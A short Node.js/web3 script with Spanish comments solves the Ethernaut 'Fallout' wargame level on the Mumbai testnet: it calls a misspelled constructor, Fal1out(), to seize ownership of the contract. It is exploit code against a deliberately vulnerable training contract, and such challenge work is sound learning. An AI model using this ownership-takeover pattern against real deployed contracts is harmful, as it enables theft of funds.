ENV_NODE=require('dotenv').config();
const Web3 = require('web3');
const Provider = require('@truffle/hdwallet-provider');

const address = '0x601eaA885bF37D28906Ad58d7508cFa1Af10E754'; // la de mi billetera desde donde hice la instancia del contrato
const privateKey = ENV_NODE.parsed.privKey; // la clave privada de la billetera para poder firmar
const nodeUrl = `https://polygon-mumbai.g.alchemy.com/v2/${process.env.PROJECT_ID}`; // el nodo con que firmaré

const SCaddress = '0x7172b9Bc86C24B97d3a44a9D5849Ee94b75E60d1'; // address del smart contract
//Abi del smart contract: JSON.stringify(contract.abi) en consola dentro de ethernaut
const abi = [{"inputs":[],"name":"Fal1out","outputs":[],"stateMutability":"payable","type":"function","payable":true,"signature":"0x6fab5ddf"},{"inputs":[],"name":"allocate","outputs":[],"stateMutability":"payable","type":"function","payable":true,"signature":"0xabaa9916"},{"inputs":[{"internalType":"address","name":"allocator","type":"address"}],"name":"allocatorBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xffd40b56"},{"inputs":[],"name":"collectAllocations","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0x8aa96f38"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x8da5cb5b"},{"inputs":[{"internalType":"address payable","name":"allocator","type":"address"}],"name":"sendAllocation","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0xa2dea26f"}];

// creo funcion asincronica que haga paso a paso
const init3 = async () => {
    // creo provider con el nodo provisto y mi llave privada para poder hacer las firmas sin metamask
    const provider = await new Provider(privateKey, nodeUrl); 
    // genero la instancia web3
    const web3 = await new Web3(provider);
    // creo instancia del contrato para llamar a sus funciones
    const myContract = await new web3.eth.Contract(abi,SCaddress);
  

    // Solucion: Hubo un typo por lo que el constructor queda como una funcion accesible
    console.log(`Owner: ${await myContract.methods.owner().call()}`);
    console.log(`My Account: ${await web3.eth.getAccounts()}`);
    let receipt;
    receipt= await myContract.methods.Fal1out().send({ from: address });
    console.log(`New Owner: ${await myContract.methods.owner().call()}`);

  }
  
  init3();